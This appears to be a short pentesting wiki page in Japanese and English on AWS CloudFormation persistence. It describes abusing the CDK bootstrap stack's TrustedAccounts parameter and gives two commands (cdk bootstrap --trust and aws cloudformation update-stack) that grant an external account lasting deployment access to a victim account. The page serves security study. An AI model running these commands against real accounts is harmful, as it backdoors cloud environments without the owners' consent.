# AWS - Cloudformation Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## CloudFormation

For more information, access:

{{#ref}}
../../aws-services/aws-cloudformation-and-codestar-enum.md
{{#endref}}

### CDK Bootstrap Stack

AWS CDKは`CDKToolkit`というCFNスタックをデプロイします。このスタックは`TrustedAccounts`というパラメータをサポートしており、外部アカウントが被害者アカウントにCDKプロジェクトをデプロイすることを許可します。攻撃者はこれを悪用して、パラメータを指定してスタックを再デプロイするためにAWS cliを使うか、あるいはAWS CDK cliを使って、被害者アカウントへの無期限のアクセスを自身に付与することができます。
```bash
# CDK
cdk bootstrap --trust 1234567890

# AWS CLI
aws cloudformation update-stack --use-previous-template --parameters ParameterKey=TrustedAccounts,ParameterValue=1234567890
```
{{#include ../../../../banners/hacktricks-training.md}}
